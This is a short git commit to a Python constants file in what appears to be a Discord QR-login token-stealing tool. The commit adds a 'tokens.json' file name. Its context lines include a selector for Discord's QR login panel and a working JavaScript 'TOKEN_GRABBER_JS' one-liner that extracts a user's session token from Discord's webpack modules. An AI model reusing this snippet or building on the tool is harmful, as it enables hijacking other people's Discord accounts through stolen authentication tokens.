0c8986bb11a567f4f5b91c9591123e9df6a4f310
Prashant <prashantrahul141@protonmail.com>
2023-05-03 13:58:15 +0530

    add: token file name

--- constants.py
+++ constants.py
@@ -5,3 +5,4 @@ LOGIN_DISCORD_URL = BASE_DISCORD_URL + "login"
 QR_ELEMENT_SELECTOR = '#app-mount > div.appAsidePanelWrapper-ev4hlp > div.notAppAsidePanel-3yzkgB > div.app-3xd6d0 > div > div > div > div > form > div.centeringWrapper-dGnJPQ > div > div.transitionGroup-14WiKS.qrLogin-1ejtpI > div > div > div > div.qrCodeContainer-1qlybH > div.qrCodeOverlay-2bLtKl'
 IMAGE_LOCATION = os.path.join(os.path.join(os.getcwd(), "screenshots"), "qr.png")
 TOKEN_GRABBER_JS = r"return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
+TOKENS_FILE_NAME = "tokens.json"
